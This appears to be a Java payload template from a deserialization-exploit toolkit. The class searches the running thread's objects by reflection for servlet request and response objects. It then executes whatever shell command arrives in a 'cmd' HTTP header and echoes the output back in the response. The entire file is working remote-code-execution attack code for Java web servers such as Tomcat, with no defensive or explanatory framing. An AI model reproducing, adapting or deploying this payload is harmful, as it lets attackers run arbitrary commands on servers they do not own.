package com.h2tg.ysogate.template.all;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Scanner;

public class DFSCmdExecTpl {
	static HashSet<Object> h;
	static ClassLoader cl = Thread.currentThread().getContextClassLoader();
	static Class hsr;//HTTPServletRequest.class
	static Class hsp;//HTTPServletResponse.class
	static String cmd;
	static Object r;
	static Object p;

	public DFSCmdExecTpl() {
		r = null;
		p = null;
		h =new HashSet<Object>();
		try {
			hsr = cl.loadClass("javax.servlet.http.HttpServletRequest");
			hsp = cl.loadClass("javax.servlet.http.HttpServletResponse");
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}

		F(Thread.currentThread(),0);
	}

	private static String getReqHeaderName() {
		return "cmd";
	}

	private static boolean i(Object obj){
		if(obj==null|| h.contains(obj)){
			return true;
		}

		h.add(obj);
		return false;
	}
	private static void p(Object o, int depth){
		if(depth > 52||(r !=null&& p !=null)){
			return;
		}
		if(!i(o)){
			if(r ==null&&hsr.isAssignableFrom(o.getClass())){
				r = o;
				//Tomcat特殊处理
				try {
					cmd = (String)hsr.getMethod("getHeader",new Class[]{String.class}).invoke(o,getReqHeaderName());
					if(cmd==null) {
						r = null;
					}else{
						//System.out.println("find Request");
						try {
							Method getResponse = r.getClass().getMethod("getResponse");
							p = getResponse.invoke(r);
						} catch (Exception e) {
							//System.out.println("getResponse Error");
							r=null;
							//e.printStackTrace();
						}
					}
				} catch (IllegalAccessException e) {
					e.printStackTrace();
				} catch (InvocationTargetException e) {
					e.printStackTrace();
				} catch (NoSuchMethodException e) {
					e.printStackTrace();
				}

			}else if(p ==null&&hsp.isAssignableFrom(o.getClass())){
				p =  o;


			}
			if(r !=null&& p !=null){
				try {
					PrintWriter pw =  (PrintWriter)hsp.getMethod("getWriter").invoke(p);
					pw.println(new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next());
					pw.flush();
					pw.close();
					//p.addHeader("out",new Scanner(Runtime.getRuntime().exec(r.getHeader("cmd")).getInputStream()).useDelimiter("\\A").next());
				}catch (Exception e){
				}
				return;
			}

			F(o,depth+1);
		}
	}
	private static void F(Object start, int depth){

		Class n=start.getClass();
		do{
			for (Field declaredField : n.getDeclaredFields()) {
				declaredField.setAccessible(true);
				Object o = null;
				try{
					o = declaredField.get(start);

					if(!o.getClass().isArray()){
						p(o,depth);
					}else{
						for (Object q : (Object[]) o) {
							p(q, depth);
						}

					}

				}catch (Exception e){
				}
			}

		}while(
				(n = n.getSuperclass())!=null
		);
	}
}